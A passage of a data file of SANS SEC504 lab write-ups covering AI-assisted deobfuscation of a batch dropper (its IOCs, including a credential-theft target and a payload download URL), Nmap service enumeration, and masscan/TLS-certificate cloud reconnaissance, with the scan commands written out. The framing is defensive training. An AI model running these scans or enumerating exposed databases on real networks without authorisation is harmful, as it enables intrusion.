      "Answer the model's clarifying questions to scope the script (coverage, format, version)",
      "Review the generated BaselineCollector.ps1 and request usage documentation",
      "Set an expert-IR system prompt for playbook generation",
      "Provide the Event of Interest (CEO-workstation breach + IOCs) to drive the playbook",
    ],
    stepDetails: [
      {
        title: "Start the local AI stack",
        description:
          "Ran the SEC504 goaichat helper, which starts the Docker service and brings up OpenWebUI (serving gpt-4.1) at http://localhost:8080. Running the model locally is the entire point: malware samples, IOCs, and internal details get pasted into prompts, and a self-hosted model keeps all of that inside the analysis environment instead of shipping it to a third-party API.",
        command: "goaichat",
        screenshot: "/labs/ai-incident-handling-102743.png",
      },
      {
        title: "Review the raw obfuscated sample",
        description:
          "Looked at analytics-backup.bat first with cat. It is deliberately unreadable: dozens of single-purpose environment variables (set EUJZ=hell, set RBVJ=\"%TEMP%\\bitsadmin.exe\", set KQOT=BITSAdmin, ...) that get concatenated later to assemble the real commands. Reading the analyst's own eyes over the raw file first means you can sanity-check whatever the model claims it says.",
        command: "cat ~/labs/falsimentis/analytics-backup.bat",
        screenshot: "/labs/ai-incident-handling-102858.png",
      },
      {
        title: "Prompt for deobfuscation",
        description:
          "Attached analytics-backup.bat and primed the model with a role and a tight task: 'You are an expert in Windows malware analysis. Analyze the attached script file. Deobfuscate the script as needed to understand the functionality.' gpt-4.1 identified it as a dropper, explained the variable-fragmentation evasion technique, and began a step-by-step breakdown. Role priming plus a concrete task is what gets a usable answer instead of a hedge.",
        screenshot: "/labs/ai-incident-handling-103331.png",
      },
      {
        title: "Decode the variables, one command per line",
        description:
          "Followed up: 'deobfuscate the script, decoding the variables. Show the commands in the script in deobfuscated form, one command per line.' The model substituted the fragmented variables back into their assembled commands and printed them as discrete lines, which is the form a human can actually reason about and copy into an IOC report.",
        screenshot: "/labs/ai-incident-handling-103454.png",
      },
      {
        title: "Deobfuscate the PowerShell step by step",
        description:
          "Narrowed in on the payload: 'Deobfuscate the PowerShell portion of the script. Show the PowerShell commands in their entirety in deobfuscated form. Slow down and think step-by-step.' The model identified the assembled %QMZA% line and walked the substitution: %BSML%=po, %AMBE%=wers, %EUJZ%=hell → powershell, %UEAI%=-c. Asking it to slow down and decompose is a reliable way to cut confident-but-wrong shortcuts on a long obfuscated string.",
        screenshot: "/labs/ai-incident-handling-103654.png",
      },
      {
        title: "Extract the IOC list",
        description:
          "Asked for a structured deliverable: 'Extract Indicators of compromise from the deobfuscated PowerShell commands and the other batch script commands. Provide the IOCs in a list format.' gpt-4.1 returned Network IOCs (http://genusight.net/collect?th=..., https://genusight.s3.amazonaws.com/XhXrnSbE.exe), File IOCs (%TEMP%\\bitsadmin.exe, a Startup-folder copy for persistence, %USERPROFILE%\\.azure\\accessTokens.json targeted for credential theft), and a Registry IOC (HKCU\\...\\Run\\BITSAdmin). Every one of these still needs analyst verification, but as a starting IOC set it is minutes of work instead of an hour.",
        screenshot: "/labs/ai-incident-handling-103834.png",
      },
      {
        title: "Prompt for a baseline-collection tool",
        description:
          "Switched from analysis to tooling: 'You are an expert PowerShell programmer ... Write a PowerShell script that collects baseline information on the configuration of a Windows host ... output configuration details in multiple files so that later use of the script on systems under investigation can reveal differences ... compared using the PowerShell compare-object command. Do you have any questions for me?' Ending with an explicit invitation for questions turns a one-shot generation into a scoped design conversation.",
        screenshot: "/labs/ai-incident-handling-104342.png",
      },
      {
        title: "Answer the model's clarifying questions",
        description:
          "gpt-4.1 asked the right questions before writing code: which configuration areas to cover (services, users/groups, scheduled tasks, listening ports, firewall rules, RDP, Run/RunOnce keys, installed software) and what output format. A model that asks before generating is far more useful than one that guesses, and it mirrors how a competent engineer would respond to the same request.",
        screenshot: "/labs/ai-incident-handling-104410.png",
      },
      {
        title: "Scope the script in the reply",
        description:
          "Answered with the full scope: cover running services, scheduled tasks, local user/group accounts, enabled firewall rules, listening ports, startup registry keys, installed programs, autoruns, remote-desktop status, and WMI subscriptions; use Compare-Object to diff; JSON output is fine; baseline once on the gold image, collect again on the host under investigation, and compare on an analyst workstation; target PowerShell 5.1. This is the same baseline-and-diff philosophy used manually in the PowerShell live-investigation lab, now codified into a reusable tool.",
        screenshot: "/labs/ai-incident-handling-104951.png",
      },
      {
        title: "Review the generated tool",
        description:
          "The model produced BaselineCollector.ps1: a parameterized script (param OutputFolder), a Save-Json helper wrapping ConvertTo-Json with UTF-8 output, and per-area collection (Get-Service projected to Name/DisplayName/Status/StartType, and so on) written to one JSON file per area under a per-hostname folder. The output is reviewed, not trusted blindly, but it is a working first draft that would have taken real time to write by hand.",
        screenshot: "/labs/ai-incident-handling-105022.png",
      },
      {
        title: "Request usage documentation",
        description:
          "Asked the model to 'Generate documentation on how to use the script ... Show sample usage for collecting data from a baseline system, and for a system under investigation. Show sample commands for comparing the results.' It produced a clean usage guide distinguishing the Baseline (gold image) and Investigation (suspect host) scenarios and showing the Compare-Object commands to diff the two JSON sets.",
        screenshot: "/labs/ai-incident-handling-105228.png",
      },
      {
        title: "Set the expert-IR system prompt",
        description:
          "For the third task, prepared a system prompt in a text file (IRplaybook.txt) that casts the model as an expert-level incident-response analyst whose job is to take an Event of Interest and produce a usable investigation playbook, with references to SANS incident-handling guidance and MITRE ATT&CK (e.g., T1110 Brute Force) and a version-control table. A strong, reusable system prompt is what makes the model's output consistent across investigations.",
        command: "gedit ~/labs/falsimentis/IRplaybook.txt",
        screenshot: "/labs/ai-incident-handling-105334.png",
      },
      {
        title: "Load the playbook system prompt",
        description:
          "Loaded the IR system prompt into a fresh gpt-4.1 conversation. The prompt instructs the model to slow down, think step-by-step about what a responder actually needs, map techniques to MITRE ATT&CK, and maintain a versioned playbook document.",
        screenshot: "/labs/ai-incident-handling-105417.png",
      },
      {
        title: "Provide the Event of Interest",
        description:
          "The model asked the right scoping question back ('describe the Event of Interest you would like to focus on'), then was given the EOI: multiple IOCs in a breach investigation centered on the CEO workstation, with a malicious batch script and Network IOCs genusight.net and genusight.s3.amazonaws.com/XhXrnSbE.exe, the same indicators recovered in the deobfuscation task. Feeding the model real, structured EOI context is what turns a generic template into a playbook tailored to this incident.",
        screenshot: "/labs/ai-incident-handling-105700.png",
      },
    ],
    outcome:
      "Ran a self-hosted gpt-4.1 across the three places an LLM genuinely helps an incident handler: it deobfuscated a variable-fragmented batch dropper and produced a verifiable IOC list in minutes, authored a working BaselineCollector.ps1 plus usage docs for live-response diffing, and drafted a MITRE ATT&CK-mapped response playbook from a CEO-workstation Event of Interest. Every output was treated as a reviewed first draft, and the whole workflow stayed on a local model so the malware and IOCs never left the environment.",
    nextStepsInProduction:
      "Standardize on a self-hosted or contractually-isolated model for anything touching malware, IOCs, or internal data, and document that policy so analysts are not pasting samples into consumer chatbots. Keep a versioned library of vetted system prompts (malware analyst, PowerShell tooling, IR playbook author) so output is consistent and reviewable. Treat every model output as a lead: verify extracted IOCs against the actual sample and threat intel, and code-review generated scripts before running them on production hosts. Capture prompts and outputs as investigation artifacts for repeatability and audit.",
    securityControlsRelevant: [
      "Self-hosted / data-isolated LLM for any sensitive-data workflow",
      "Policy prohibiting upload of malware or IOCs to consumer AI services",
      "Mandatory human review of LLM-generated code before execution",
      "IOC verification against the source sample and threat intel before action",
      "Versioned, vetted prompt library for repeatable analysis",
      "Logging of AI prompts/outputs as investigation artifacts",
    ],
    keyFindings: [
      "gpt-4.1 deobfuscated analytics-backup.bat's variable fragmentation and reconstructed the hidden PowerShell (%QMZA% → powershell -c ...)",
      "Extracted IOCs: genusight.net/collect, genusight.s3.amazonaws.com/XhXrnSbE.exe, %TEMP%\\bitsadmin.exe, Startup-folder persistence, %USERPROFILE%\\.azure\\accessTokens.json, HKCU Run\\BITSAdmin",
      "Generated BaselineCollector.ps1 (PowerShell 5.1, JSON output) for Compare-Object live-response diffing, plus usage docs",
      "Drafted a MITRE ATT&CK-mapped IR playbook (incl. T1110 Brute Force) from a CEO-workstation Event of Interest",
      "Entire workflow run on a local gpt-4.1 (OpenWebUI/Docker) so malware and IOCs never left the environment",
    ],
    takeaway: [
      "The biggest decision in this lab is invisible in the output: it runs on a self-hosted model. The moment an analyst pastes a malware sample or an internal IOC into a consumer chatbot, that data has left the investigation and may be retained, logged, or trained on. Self-hosting gpt-4.1 in Docker is what makes AI-assisted analysis defensible rather than a data-exfiltration incident of your own making. Capability is the easy part; the operational-security choice is the part that separates a professional workflow from a liability.",
      "Prompting for security work is a real skill and the lab demonstrates the two highest-value techniques. Role priming ('you are an expert in Windows malware analysis') sets the model's frame, and step-by-step decomposition ('slow down, think step-by-step, one command per line') stops it from taking confident shortcuts on long obfuscated strings. The same model that would hand-wave a single sloppy prompt produces precise variable substitutions when the task is decomposed properly.",
      "AI is an accelerator, not an oracle, and the discipline is verification. The model's IOC list and generated PowerShell were excellent starting points, but the IOCs still have to be checked against the actual sample and the script still has to be code-reviewed before it runs on a production host. The win is real (an hour of deobfuscation becomes minutes), but it is a win precisely because a skilled analyst is in the loop to catch the cases where the model is confidently wrong.",
    ],
    screenshots: [
      { src: "/labs/ai-incident-handling-102743.png", alt: "goaichat starts OpenWebUI", caption: "goaichat brings up gpt-4.1 (OpenWebUI) at localhost:8080" },
      { src: "/labs/ai-incident-handling-102858.png", alt: "Raw obfuscated batch", caption: "cat analytics-backup.bat: variable-fragmented obfuscation" },
      { src: "/labs/ai-incident-handling-103331.png", alt: "Deobfuscation prompt", caption: "Role-primed prompt: 'expert in Windows malware analysis ... deobfuscate'" },
      { src: "/labs/ai-incident-handling-103454.png", alt: "Decode variables one per line", caption: "Model prints the assembled commands one per line" },
      { src: "/labs/ai-incident-handling-103654.png", alt: "Step-by-step PowerShell decode", caption: "Deobfuscating the %QMZA% line: %BSML%%AMBE%%EUJZ% = powershell" },
      { src: "/labs/ai-incident-handling-103834.png", alt: "Extracted IOC list", caption: "IOCs: genusight.net/collect, bitsadmin.exe, accessTokens.json, HKCU Run\\BITSAdmin" },
      { src: "/labs/ai-incident-handling-104342.png", alt: "Baseline tool prompt", caption: "Prompt for a PowerShell baseline collector using Compare-Object" },
      { src: "/labs/ai-incident-handling-104410.png", alt: "Model clarifying questions", caption: "gpt-4.1 asks about coverage and output format before coding" },
      { src: "/labs/ai-incident-handling-104951.png", alt: "Scope reply", caption: "Scoping the script: services, tasks, users, firewall, ports, WMI; PowerShell 5.1" },
      { src: "/labs/ai-incident-handling-105022.png", alt: "Generated BaselineCollector.ps1", caption: "BaselineCollector.ps1 with Save-Json helper and per-area JSON output" },
      { src: "/labs/ai-incident-handling-105208.png", alt: "Documentation prompt", caption: "Request for usage documentation with sample commands" },
      { src: "/labs/ai-incident-handling-105228.png", alt: "Generated documentation", caption: "Baseline vs Investigation usage guide with Compare-Object" },
      { src: "/labs/ai-incident-handling-105334.png", alt: "IR playbook system prompt", caption: "gedit IRplaybook.txt: expert-IR system prompt with MITRE ATT&CK" },
      { src: "/labs/ai-incident-handling-105417.png", alt: "Load playbook prompt", caption: "Playbook system prompt loaded into a fresh gpt-4.1 conversation" },
      { src: "/labs/ai-incident-handling-105447.png", alt: "Model asks for the EOI", caption: "gpt-4.1 asks the analyst to describe the Event of Interest" },
      { src: "/labs/ai-incident-handling-105700.png", alt: "Provide the Event of Interest", caption: "EOI: CEO-workstation breach with genusight IOCs" },
    ],
  },
  {
    id: 25,
    courseSlug: "sec504",
    slug: "nmap-network-discovery",
    title: "Network Discovery and Service Enumeration with Nmap",
    course: "SEC504 - Hacker Tools, Techniques, and Incident Handling",
    role: "Solo, Lab",
    focus: "Network Reconnaissance",
    level: "SEC504",
    date: "Jun 2026",
    artifacts: "Sanitized Nmap terminal output from the SEC504 Slingshot Linux lab against the 172.30.0.0/24 range",
    context:
      "This lab works the full Nmap reconnaissance funnel against a lab subnet (172.30.0.0/24): start with host discovery, narrow to open ports, fingerprint service versions, and finally run NSE scripts to extract detailed configuration from the interesting services. It also contrasts unprivileged and privileged scans to show how scan technique changes what you can see, and ends by finding three real misconfigurations: SSH hidden on a non-standard port, an unauthenticated MongoDB instance, and an SMB server that does not require message signing.",
    summary:
      "Ran the Nmap recon funnel across 172.30.0.0/24: a privileged ARP ping sweep (sudo nmap -sn) found a host (172.30.0.26) that the unprivileged sweep missed, then full TCP connect scans (-sT -p 1-65535) and version detection (-sV) mapped the services. Findings included Dropbear SSH 2022.83 hiding on non-standard port 2430 plus nginx and MariaDB on 172.30.0.20, an exposed MongoDB 5.0.27 on 172.30.0.26 that the mongodb-databases NSE script enumerated without authentication (config, local, admin, builds), and an SMB/NetBIOS server (FILESTOR) on 172.30.0.114 whose smb2-security-mode reported message signing enabled but not required. Saved the MongoDB scan with -oN for reporting.",
    whyThisMatters:
      "Nmap is the first tool on both sides of an engagement: attackers map your attack surface with it, and defenders use the exact same output to find the exposures before someone else does. Knowing the funnel (discovery, ports, versions, scripts) and reading the results critically is what turns a wall of port numbers into actionable findings like 'this MongoDB answers queries with no password.' The unprivileged-vs-privileged contrast also teaches a lesson that bites real assessments: the scan technique you choose determines what you are even able to find.",
    tldr: [
      "A privileged ARP ping sweep (sudo nmap -sn) found a live host the unprivileged sweep missed entirely",
      "Mapped services with full-range -sT -p 1-65535 then -sV: caught Dropbear SSH hiding on port 2430, plus nginx and MariaDB",
      "NSE scripts found an unauthenticated MongoDB 5.0.27 (enumerated its databases) and an SMB server not requiring message signing",
    ],
    skillsDemonstrated: [
      "Nmap host discovery (ICMP/TCP vs ARP ping sweeps)",
      "Privileged vs unprivileged scan tradeoffs",
      "Full-range TCP port scanning and version detection (-sV)",
      "Nmap Scripting Engine (NSE) enumeration (-sC, --script)",
      "Service misconfiguration identification (exposed DB, weak SMB signing, non-standard SSH)",
      "Scan output capture for reporting (-oN)",
    ],
    tools: ["Nmap 7.60", "NSE (mongodb-databases, smb2-security-mode, nbstat)", "Slingshot Linux", "CLI"],
    steps: [
      "Host discovery: ping sweep the subnet unprivileged, then again with sudo (ARP)",
      "Compare the two sweeps to see which hosts each technique reveals",
      "Default TCP connect scan of 172.30.0.20, then the full 65,535-port range",
      "Version-detect the open ports on 172.30.0.20 with -sV",
      "Full-range scan 172.30.0.26 and version-detect the open port",
      "Run default NSE scripts (-sC) against the MongoDB port and save output with -oN",
      "Run a targeted --script mongodb-databases against the exposed instance",
      "Full-range scan 172.30.0.114 and run SMB NSE scripts on 139/445",
    ],
    stepDetails: [
      {
        title: "Host discovery, unprivileged then privileged",
        description:
          "Ran a no-port ping sweep of the whole range: nmap -n -sn 172.30.0.1-254 found 4 hosts up (.1, .20, .114, .152). Re-running the same sweep with sudo found 5 hosts up, including 172.30.0.26, and returned MAC addresses. With root on the local segment Nmap uses ARP for discovery, which finds hosts that ignore ICMP and the unprivileged TCP probes. A host you never discover is a host you never assess.",
        command: "nmap -n -sn 172.30.0.1-254\nsudo nmap -n -sn 172.30.0.1-254",
        commandBreakdown: "-n: no reverse-DNS\n-sn: host discovery only, no port scan\nsudo: enables ARP discovery + MAC resolution on the local segment",
        screenshot: "/labs/nmap-discovery-142347.png",
      },
      {
        title: "Default then full-range TCP scan of .20",
        description:
          "Scanned 172.30.0.20 with a TCP connect scan. The default top-1000 ports showed 23/telnet filtered, 80/http open, 135/msrpc filtered, 443/https open, 445/microsoft-ds filtered, and 3306/mysql open. Re-running across all 65,535 ports (-p 1-65535) surfaced one more: 2430/tcp open, labeled 'venus' by Nmap's port-to-service guess. The lesson is that the default scan misses high ports, and attackers deliberately park services up there.",
        command: "sudo nmap -n -sT 172.30.0.20\nsudo nmap -n -sT -p 1-65535 172.30.0.20",
        commandBreakdown: "-sT: full TCP connect scan\n-p 1-65535: every TCP port, not just the top 1000",
        screenshot: "/labs/nmap-discovery-142721.png",
      },
      {
        title: "Version-detect the .20 services",
        description:
          "Ran -sV against the open ports (80, 443, 2430, 3306). The versions told the real story: 80 and 443 were nginx, 3306 was MySQL 5.5.5-10.11.6-MariaDB, and 2430, the port Nmap had guessed as 'venus', was actually Dropbear sshd 2022.83 (SSH protocol 2.0). SSH on a non-standard high port is a classic move to slip past port-based monitoring; only version detection, not the port number, reveals it.",
        command: "sudo nmap -n -sT -sV -p 80,443,2430,3306 172.30.0.20",
        commandBreakdown: "-sV: probe open ports to identify the service and version\nVersion detection corrects Nmap's port-number guesses",
        screenshot: "/labs/nmap-discovery-142954.png",
      },
      {
        title: "Find and version-detect MongoDB on .26",
        description:
          "Full-range scanned 172.30.0.26 (the host only the privileged sweep had found): 80 and 443 filtered, but 27017/tcp open, which is MongoDB's default port. A targeted -sV confirmed MongoDB 5.0.27. Port 27017 reachable from the network is itself a finding worth chasing, because MongoDB has a long history of being deployed with no authentication.",
        command: "sudo nmap -n -sT -p 1-65535 172.30.0.26\nsudo nmap -n -sT -p 27017 -sV 172.30.0.26",
        screenshot: "/labs/nmap-discovery-143233.png",
      },
      {
        title: "NSE enumeration of MongoDB and save output",
        description:
          "Ran the default script set (-sC) against port 27017. The mongodb-databases and mongodb-info scripts answered with no authentication: a full database listing (config, local, admin, builds with sizes on disk), build info, version 5.0.27, and the OpenSSL/storage-engine details. An unauthenticated MongoDB exposed to the network is a critical finding: anyone who can reach the port can read the data. Re-ran with -oN nmap_mongodb_scan.txt to save the evidence for the report, then confirmed the saved file with head.",
        command: "sudo nmap -n -sT -p 27017 -sC 172.30.0.26\nsudo nmap -n -sT -p 27017 -sC -oN nmap_mongodb_scan.txt 172.30.0.26\nhead nmap_mongodb_scan.txt",
        commandBreakdown: "-sC: run the default safe NSE script category\n-oN: write normal (human-readable) output to a file",
        screenshot: "/labs/nmap-discovery-143450.png",
      },
      {
        title: "Targeted mongodb-databases script",
        description:
          "Ran a single NSE script directly with --script mongodb-databases to re-pull just the database inventory (builds, admin, local, config) in 0.50 seconds. Targeting one script instead of the whole default set is faster and produces a cleaner artifact when you already know exactly what you want to confirm.",
        command: "sudo nmap -n -sT -p 27017 172.30.0.26 --script mongodb-databases",
        commandBreakdown: "--script <name>: run a specific NSE script instead of a category",
        screenshot: "/labs/nmap-discovery-144124.png",
      },
      {
        title: "Scan .114 and enumerate SMB",
        description:
          "Full-range scanned 172.30.0.114: 139/netbios-ssn and 445/microsoft-ds open. Running default scripts on those ports returned the SMB host scripts: nbstat resolved the NetBIOS name FILESTOR, and smb2-security-mode reported SMB 2.10 with 'Message signing enabled but not required.' Signing enabled-but-not-required leaves the server open to SMB relay attacks, because a man-in-the-middle can strip the optional signing. The name FILESTOR also hints at a file server worth prioritizing.",
        command: "sudo nmap -n -sT -p 1-65535 172.30.0.114\nsudo nmap -n -sT -sC -p 139,445 172.30.0.114",
        commandBreakdown: "-sC on 139/445: runs the SMB/NetBIOS NSE scripts (nbstat, smb2-security-mode, smb2-time)",
        screenshot: "/labs/nmap-discovery-143847.png",
      },
    ],
    outcome:
      "Worked the Nmap funnel end to end on 172.30.0.0/24 and surfaced three concrete misconfigurations. A privileged ARP sweep found a host (172.30.0.26) the unprivileged sweep missed; full-range scanning plus -sV caught Dropbear SSH hiding on port 2430 alongside nginx and MariaDB on .20; NSE confirmed an unauthenticated MongoDB 5.0.27 on .26 by listing its databases; and SMB scripts on .114 (FILESTOR) showed message signing was not required. The MongoDB evidence was saved with -oN for reporting.",
    nextStepsInProduction:
      "Treat the unauthenticated MongoDB as a critical: enable authentication, bind it to localhost or a private interface, and firewall 27017 immediately, then audit access logs for prior unauthorized reads. Move Dropbear SSH back to a managed port behind key-based auth and monitoring, since a non-standard port is obscurity, not security. Enforce 'require message signing' on the FILESTOR SMB server to close the relay path. Schedule recurring authenticated Nmap (or a dedicated scanner) sweeps and diff results over time so newly exposed services and version drift get flagged automatically.",
    securityControlsRelevant: [
      "Authentication and network binding on database services (MongoDB)",
      "Host-based and network firewalls restricting management ports",
      "Mandatory SMB message signing to prevent relay attacks",
      "Key-based SSH on managed ports with monitoring (not port obscurity)",
      "Recurring authenticated vulnerability/port scanning with diffing",
      "Network segmentation limiting east-west reachability to services",
    ],
    keyFindings: [
      "Privileged ARP sweep found 172.30.0.26, which the unprivileged ICMP/TCP sweep missed",
      "172.30.0.20: nginx (80/443), MariaDB 10.11.6 (3306), and Dropbear SSH 2022.83 on non-standard port 2430",
      "172.30.0.26: MongoDB 5.0.27 on 27017 enumerable without authentication (config, local, admin, builds)",
      "172.30.0.114 (FILESTOR): SMB 2.10 with message signing enabled but not required (relay-exposed)",
      "Saved MongoDB NSE output to nmap_mongodb_scan.txt with -oN for reporting",
    ],
    takeaway: [
      "The unprivileged-versus-privileged contrast is the most important lesson in this lab, and it is easy to skip past. The plain nmap -sn sweep reported four hosts; the sudo sweep reported five, and the extra host (172.30.0.26) was the one running the unauthenticated MongoDB. On a local segment, root lets Nmap use ARP, which finds hosts that ignore ICMP. If your assessment methodology only ever runs unprivileged discovery, the single worst exposure on the network can be invisible to you and fully visible to an attacker already on the segment.",
      "Version detection earns its runtime every time. Nmap's bare port scan labeled 2430 as 'venus' from its static port-to-name table, which is meaningless. Only -sV revealed it was Dropbear SSH on a non-standard port, a deliberate attempt to hide a remote-access service from anyone scanning the usual port 22. Reading the port number alone would have missed it entirely; the version banner is what turns a number into a finding.",
      "The MongoDB result is the kind of finding that still causes real breaches. A database listening on its default port that answers a stranger's NSE script with its full database inventory and no password is not a theoretical risk. Exposed MongoDB instances have leaked enormous datasets for exactly this reason. Nmap found it in seconds with -sC. The same scan a defender runs to catch this is the scan an attacker runs to exploit it, which is the whole argument for scanning your own surface first and on a schedule.",
    ],
    screenshots: [
      { src: "/labs/nmap-discovery-142347.png", alt: "Unprivileged vs privileged ping sweep", caption: "sudo nmap -sn finds 172.30.0.26 (5 hosts) that the unprivileged sweep (4 hosts) missed" },
      { src: "/labs/nmap-discovery-142721.png", alt: "Default vs full-range TCP scan of .20", caption: "-p 1-65535 surfaces 2430/tcp beyond the default top-1000 ports" },
      { src: "/labs/nmap-discovery-142954.png", alt: "Version detection on .20", caption: "-sV: port 2430 is Dropbear SSH 2022.83, plus nginx and MariaDB 10.11.6" },
      { src: "/labs/nmap-discovery-143233.png", alt: "Full-range scan of .26", caption: "172.30.0.26: 27017/tcp open (MongoDB)" },
      { src: "/labs/nmap-discovery-143351.png", alt: "Version detection on MongoDB", caption: "-sV confirms MongoDB 5.0.27 on 27017" },
      { src: "/labs/nmap-discovery-143450.png", alt: "MongoDB NSE enumeration", caption: "-sC mongodb-databases lists databases with no authentication" },
      { src: "/labs/nmap-discovery-143646.png", alt: "Saved MongoDB scan output", caption: "-oN nmap_mongodb_scan.txt captures the full mongodb-info output" },
      { src: "/labs/nmap-discovery-143713.png", alt: "Confirm saved scan file", caption: "head nmap_mongodb_scan.txt verifies the saved evidence" },
      { src: "/labs/nmap-discovery-143847.png", alt: "SMB enumeration on .114", caption: "139/445 open on FILESTOR; smb2-security-mode: signing enabled but not required" },
      { src: "/labs/nmap-discovery-144124.png", alt: "Targeted mongodb-databases script", caption: "--script mongodb-databases re-pulls the inventory in 0.50s" },
    ],
  },
  {
    id: 26,
    courseSlug: "sec504",
    slug: "cloud-attack-surface-mapping",
    title: "Cloud Attack Surface Mapping with masscan and TLS Fingerprinting",
    course: "SEC504 - Hacker Tools, Techniques, and Incident Handling",
    role: "Solo, Lab",
    focus: "Cloud Network Forensics",
    level: "SEC504",
    date: "Jun 2026",
    artifacts: "Sanitized masscan, tls-scan, jq, and nmap output from the SEC504 Slingshot Linux lab against a 10.200.0.0/16 cloud range",
    context:
      "Cloud IP space has no reverse DNS to map an address back to an owner, so this lab uses the TLS certificate as the attribution mechanism. The workflow is: sweep a /16 with masscan for one port, pull each host's certificate with tls-scan, parse the subject common name with jq to find which anonymous cloud IP belongs to the target organization, then enumerate that host with nmap.",
    summary:
      "Swept 65,536 addresses in 10.200.0.0/16 for port 443 with masscan at 10,000 packets/sec, which returned 14 live TLS hosts. Extracted the IPs with awk, pulled every certificate with tls-scan (14/14 handshakes in 0.13s), and parsed the subject CN with jq. Most certs were wildcards for unrelated tenants (*.genusight.com, *.sunsetisp.com, *.wright.art), but one host, 10.200.74.2, presented downloads.falsimentis.com, the target. An nmap http-enum against it found nginx 1.18.0 exposing /robots.txt and a /css/ directory listing.",
    whyThisMatters:
      "In shared cloud ranges you cannot tell whose asset an IP is by the address alone, and that is exactly the gap an attacker exploits to find a target's forgotten internet-facing hosts. The TLS certificate is the tell: the subject CN names the service even when DNS says nothing. The same masscan-to-certificate pipeline a red team uses to find your shadow assets is what an asset-management program should run against its own ranges first.",
    tldr: [
      "masscan swept a /16 (65,536 hosts) for port 443 in seconds and found 14 live TLS endpoints",
      "tls-scan + jq parsed each certificate's subject CN to attribute anonymous cloud IPs to their owners",
      "One cert (downloads.falsimentis.com on 10.200.74.2) identified the target; nmap http-enum found a directory listing",
    ],
    skillsDemonstrated: [
      "High-rate network sweeping with masscan (--rate, -oL)",
      "TLS certificate collection and parsing (tls-scan)",
      "JSON field extraction with jq",
      "Cloud asset attribution via certificate subject CN",
      "Targeted web enumeration with nmap NSE (http-enum)",
    ],
    tools: ["masscan 1.3.9", "tls-scan", "jq", "awk", "Nmap 7.60", "Slingshot Linux"],
    steps: [
      "Sweep 10.200.0.0/16 for port 443 with masscan and save a list file",
      "Extract just the live IPs with awk",
      "Collect every host's TLS certificate with tls-scan into JSON",
      "Parse the subject CN per IP with jq to attribute owners",
      "Grep the target org's domain out of the parsed output",
      "Enumerate the identified web host with nmap http-enum",
    ],
    stepDetails: [
      {
        title: "Mass-sweep the /16 for port 443",
        description:
          "Ran masscan across the entire 10.200.0.0/16 (65,536 hosts) for a single port at 10,000 packets/sec. The list output (-oL) recorded 14 open 443/tcp hosts. Scanning one port across a huge range is the fast way to find the live TLS surface before spending time on any single host.",
        command: "masscan -p 443 --rate 10000 -oL simcloud.txt 10.200.0.0/16\nwc -l simcloud.txt",
        commandBreakdown: "-p 443: single port\n--rate 10000: packets per second\n-oL: list output format",
        screenshot: "/labs/cloud-recon-154120.png",
      },
      {
        title: "Extract the live IPs",
        description:
          "masscan -oL lines look like 'open tcp 443 10.200.x.x <epoch>'. awk pulled field 4 (the IP) into a clean target list for the certificate scan.",
        command: "awk '/open/ {print $4}' simcloud.txt > simcloud-targets.txt",
        commandBreakdown: "/open/: match result lines\n{print $4}: the IP address column",
        screenshot: "/labs/cloud-recon-154334.png",
      },
      {
        title: "Collect TLS certificates",
        description:
          "tls-scan read the target list on stdin and completed all 14 handshakes in 0.13 seconds, writing structured JSON. This is the step that turns a list of anonymous IPs into a set of certificates that name their services.",
        command: "tls-scan --port=443 --cacert=/opt/tls-scan/ca-bundle.crt -o simcloud-tlsinfo.json < simcloud-targets.txt",
        commandBreakdown: "--port=443: TLS port\n--cacert: CA bundle for chain validation\n-o: JSON output; reads targets on stdin",
        screenshot: "/labs/cloud-recon-154558.png",
      },
      {
        title: "Attribute IPs by certificate subject CN",
        description:
          "jq projected each IP next to its certificate subject CN. Most were wildcards for unrelated tenants sharing the cloud range (*.genusight.com, *.sunsetisp.com). One stood out: 10.200.74.2 presenting downloads.falsimentis.com, the target organization.",
        command: "jq '.ip + \" \" + .certificateChain[].subjectCN' simcloud-tlsinfo.json\njq '.ip + \" \" + .certificateChain[].subjectCN' simcloud-tlsinfo.json | grep falsimentis",
        commandBreakdown: "certificateChain[].subjectCN: the CN names the service\ngrep isolates the target's asset",
        screenshot: "/labs/cloud-recon-154644.png",
      },
      {
        title: "Enumerate the identified host",
        description:
          "With the target IP known, nmap -sV plus the http-enum NSE script fingerprinted nginx 1.18.0 and surfaced /robots.txt and a browsable /css/ directory listing. Attribution first, enumeration second, so the noisy scan only ever touches the one host that matters.",
        command: "sudo nmap -sT -sV -p 443 --script http-enum 10.200.74.2",
        commandBreakdown: "-sV: version detection\n--script http-enum: enumerate web paths",
        screenshot: "/labs/cloud-recon-154815.png",
      },
    ],
    outcome:
      "Reduced a 65,536-address cloud range to the single host that belonged to the target by pivoting on TLS certificate subject CNs, then confirmed an exposed directory listing on it. 14 live TLS hosts, one match, one finding, in well under a minute of active scanning.",
    nextStepsInProduction:
      "Run the same masscan-to-certificate sweep against your own cloud ranges on a schedule and diff the results so newly exposed hosts and unexpected certificate names get flagged as possible shadow assets. Remove directory listing (autoindex off) on the identified nginx host and review what /css/ and /robots.txt exposed. Feed discovered certificates into an inventory keyed on subject CN so attribution is automatic next time.",
    securityControlsRelevant: [
      "Continuous external attack surface management over owned cloud ranges",
      "Certificate transparency / inventory keyed on subject CN",
      "Disabling directory listing (autoindex) on web servers",
      "Egress and ingress controls limiting which cloud hosts expose 443",
    ],
    keyFindings: [
      "masscan found 14 live 443/tcp hosts in a 65,536-address /16 in seconds",
      "TLS certificate subject CN attributed each anonymous cloud IP to an owner",
      "10.200.74.2 = downloads.falsimentis.com, the target, isolated by a single grep",
      "nginx 1.18.0 on the target exposed /robots.txt and a /css/ directory listing",
    ],
    takeaway: [
      "The lesson that transfers to real cloud security is that DNS is not the source of truth for who owns an IP; the certificate is. In a shared range, a reverse lookup gives you nothing, but the TLS handshake hands you the service name for free. Any attacker who can sweep a range can attribute it, which means defenders have no advantage here unless they are running the same sweep against their own space first.",
      "Speed is the point of the masscan stage. Sweeping 65,536 hosts for one port takes seconds, which changes the economics of reconnaissance: an attacker does not need to know where your assets are, they can afford to look at an entire /16 and let the certificates sort out ownership. Asset management that relies on a hand-maintained list will always be behind the tool that just scans everything.",
    ],
    screenshots: [
      { src: "/labs/cloud-recon-154120.png", alt: "masscan sweep of the /16", caption: "masscan -p 443 --rate 10000 across 65,536 hosts returns 14 live TLS endpoints" },
      { src: "/labs/cloud-recon-154158.png", alt: "masscan list output", caption: "simcloud.txt: open tcp 443 records, one per live host" },
      { src: "/labs/cloud-recon-154334.png", alt: "Extract IPs with awk", caption: "awk '/open/ {print $4}' pulls the 14 target IPs" },
